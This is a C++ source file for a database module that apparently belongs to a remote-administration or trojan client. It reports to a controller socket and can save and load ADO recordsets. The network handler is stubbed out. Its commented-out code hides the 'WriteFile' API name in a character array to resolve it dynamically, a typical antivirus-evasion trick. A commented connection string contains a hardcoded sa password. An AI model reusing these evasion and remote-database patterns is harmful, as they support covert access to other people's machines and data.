
#include "../Declare.h"   //动态调用库函数
#include "DBManager.h"


CDBManager::CDBManager(CClientSocket *pClient) :CManager(pClient)
{
	BYTE	bToken = TOKEN_DATABASE;
	Send((LPBYTE)&bToken, 1);
}


CDBManager::~CDBManager()
{
	MessageBox(NULL, "析构函数", "1", 0);
	return;
}

void CDBManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	/*
	if (nSize == 1 && lpBuffer[0] == COMMAND_NEXT)
	{
		NotifyDialogIsOpen();
		return;
	}

	unsigned long	ByteWrite;
	char HvnXs02[] = { 'W', 'r', 'i', 't', 'e', 'F', 'i', 'l', 'e', '\0' };
	WriteFileT pWriteFile = (WriteFileT)GetProcAddress(LoadLibrary("KERNEL32.dll"), HvnXs02);
	pWriteFile(m_hWritePipeHandle, lpBuffer, nSize, &ByteWrite, NULL);
	*/
	MessageBox(NULL, "db", "1", 0);
}

HRESULT CDBManager::SaveRS(_RecordsetPtr pRS/*IN*/, IStream* * ppStream/*OUT*/)
{
	HRESULT hr = S_OK;
	try
	{
		*ppStream = NULL;

		// QI and return IPersistStream
		IPersistStreamPtr pIPersist(pRS);
		if (pIPersist)
		{
			//Create a standard stream in memory
			if (FAILED(hr = CreateStreamOnHGlobal(0, TRUE, (IStream **)ppStream)))
				return hr;

			// Persist the pRS
			if (FAILED(hr = OleSaveToStream(pIPersist, *ppStream)))
				return hr;

		}
		else
			return E_NOINTERFACE;
	}
	catch (_com_error & e)
	{
		return e.Error();
	}
	return S_OK;

}

HRESULT CDBManager::LoadRS(_Recordset* *ppRS/*OUT*/, IStreamPtr pStream/*IN*/)
{
	HRESULT hr = S_OK;
	try
	{
		*ppRS = NULL;
		if (NULL == pStream)
			return E_NOINTERFACE;
		// Load the pRS.
		LARGE_INTEGER li;
		li.QuadPart = 0;

		//Set the pointer to the beginning of the stream
		if (FAILED(hr = pStream->Seek(li, STREAM_SEEK_SET, 0)))
			return hr;

		if (FAILED(hr = OleLoadFromStream(pStream,
			__uuidof(_Recordset),
			reinterpret_cast<LPVOID *>(ppRS)))
			)
			return hr;
	}
	catch (_com_error & e)
	{
		return e.Error();
	}
	return S_OK;
}



/*
void CMssqltestDlg::OnButton1()
{
	// TODO: Add your control notification handler code here
	int i;
	_ConnectionPtr   m_pConnection;
	_CommandPtr m_pCommand;
	_RecordsetPtr m_pRecordset;

	IStreamPtr pStream;

	LONG lStyle;
	lStyle = GetWindowLong(m_list.m_hWnd, GWL_STYLE);//获取当前窗口style
	lStyle &= ~LVS_TYPEMASK; //清除显示方式位
	lStyle |= LVS_REPORT; //设置style
	SetWindowLong(m_list.m_hWnd, GWL_STYLE, lStyle);//设置style
	DWORD dwStyle = m_list.GetExtendedStyle();
	dwStyle |= LVS_EX_FULLROWSELECT;//选中某行使整行高亮（只适用与report风格的listctrl）
	dwStyle |= LVS_EX_GRIDLINES;//网格线（只适用与report风格的listctrl）
	dwStyle |= LVS_EX_CHECKBOXES;//item前生成checkbox控件
	m_list.SetExtendedStyle(dwStyle); //设置扩展风格 

	//  连接数据库：  
	HRESULT  hr; //返回结果变量
	try
	{
		hr = m_pConnection.CreateInstance("ADODB.Connection"); //创建Connection对象
		if (SUCCEEDED(hr))
		{
			//hr=m_pConnection->Open("Provider=SQLOLEDB;Server=808644DA83B446C/SQLEXPRESS;Database=ChinabaseSQLServer;UserID=sa;pwd=123","","",adModeUnknown);   //;Integrated Security=SSPI
			CString strCon;
			tboxCon.GetWindowTextA(strCon);
			m_pConnection->Open(_bstr_t(strCon), "", "", adModeUnknown);
			//MessageBox("连接SQL运行成功!","成功",MB_OK);
			this->SetWindowTextA("连接SQL运行成功!");


			m_pCommand.CreateInstance("ADODB.Command");

			CString strSQL;
			tboxSQL.GetWindowTextA(strSQL);

			_variant_t vNULL;
			vNULL.vt = VT_ERROR;
			vNULL.scode = DISP_E_PARAMNOTFOUND;///定义为无参数
			m_pCommand->ActiveConnection = m_pConnection;///非常关键的一句，将建立的连接赋值给它
			m_pCommand->CommandText = _bstr_t(strSQL); //"SELECT * FROM p_pf_task";///命令字串
			m_pRecordset = m_pCommand->Execute(&vNULL, &vNULL, adCmdText);///执行命令，取得记录集

			m_list.DeleteAllItems();								//删除所有行
			while (m_list.DeleteColumn(0));						//删除所有列
			for (i = 0; i < m_pRecordset->GetFields()->GetCount(); i++)
			{
				BSTR bs;
				m_pRecordset->GetFields()->GetItem((long)i)->get_Name(&bs);
				CString cs = bs;
				m_list.InsertColumn(0, cs, LVCFMT_LEFT, 100);
			}

			SaveRS(m_pRecordset, (IStream**)&pStream);

			m_pRecordset->MoveFirst();
			while (!m_pRecordset->rsEOF)
			{
				//新插入的数据在下面						  
				int nIndex = m_list.GetItemCount();
				LV_ITEM lvItem;
				lvItem.mask = LVIF_TEXT;
				lvItem.iItem = nIndex;     //行数
				lvItem.iSubItem = 0;
				lvItem.pszText = "";//(char*)(LPCTSTR)var;   //第一列
				//在最后一行插入记录值.
				m_list.InsertItem(&lvItem);

				// printf(m_pRecordset->GetCollect(("myage")));
				for (int i = 0; i < m_pRecordset->GetFields()->GetCount(); i++)
				{
					_variant_t  var;
					//VARIANT var;
					m_pRecordset->GetFields()->GetItem((long)i)->get_Value(&var);
					if (var.vt != VT_NULL)
					{
						//printf((LPCTSTR)_bstr_t(var));
						//AfxMessageBox((LPCTSTR)_bstr_t(var));
						CString val = (LPCTSTR)_bstr_t(var);


						//插入其它列
						m_list.SetItemText(nIndex, i, val);

					}
				}

				m_pRecordset->MoveNext();
			}
		}
	}
	catch (_com_error   e)
	{
		CString   errorMsg;
		errorMsg.Format("连接数据库失败!\r\n错误信息:%s", e.ErrorMessage());
		MessageBox(errorMsg, "错误", MB_OK);
	}
}
*/